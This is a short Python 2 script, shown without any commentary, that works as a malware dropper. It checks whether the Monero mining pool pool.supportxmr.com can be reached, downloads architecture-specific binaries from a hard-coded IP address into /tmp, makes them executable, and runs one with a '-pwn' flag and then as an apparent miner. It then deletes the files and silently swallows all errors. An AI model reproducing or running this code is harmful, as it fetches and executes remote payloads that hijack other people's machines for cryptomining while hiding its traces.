import urllib
import platform
import os

output = os.popen('sh -c bytes=$(ping -c 1 pool.supportxmr.com 2>/dev/null|grep "bytes of data" | wc -l); if [[ "$bytes" -eq "0" ]]; then url=" "; else url="-d";fi; echo $url').read()
if platform.architecture()[0] == "64bit":
	urlx64 = "http://209.141.40.190/x86_64"
	bx64 = "http://209.141.40.190/bashirc.x86_64"
	try:
		f = urllib.urlopen(urlx64)
		if f.code == 200:
			data = f.read()
			with open ("/tmp/dbused", "wb") as code:
				code.write(data)
		xx = urllib.urlopen(bx64)
		if xx.code == 200:
			data = xx.read()
			with open ("/tmp/bashirc.x86_64", "wb") as code:
				code.write(data)
		os.chmod("/tmp/dbused", 0o777)
		os.chmod("/tmp/bashirc.x86_64", 0o777)
		os.system("/tmp/dbused -pwn")
		os.system("/tmp/dbused -c " + output)
		os.system("/tmp/bashirc.x86_64")
		os.system("rm -rf /tmp/dbused")
		os.system("rm -rf /tmp/bashirc.x86_64")
	except:
		pass
else:
	urlyy = "http://209.141.40.190/i686"
	yy32 = "http://209.141.40.190/bashirc.i686"
	try:
		yy = urllib.urlopen(urlyy)
		if yy.code == 200:
			data = yy.read()
			with open ("/tmp/dbused", "wb") as code:
				code.write(data)
		yy = urllib.urlopen(yy32)
		if yy.code == 200:
			data = xx.read()
			with open ("/tmp/bashirc.i686", "wb") as code:
				code.write(data)
		os.chmod("/tmp/dbused", 0o777)
		os.chmod("/tmp/bashirc.i686", 0o777)
		os.system("/tmp/dbused -pwn")
		os.system("/tmp/dbused -c " + output)
		os.system("/tmp/bashirc.i686")
		os.system("rm -rf /tmp/dbused")
		os.system("rm -rf /tmp/bashirc.i686")
	except:
		pass
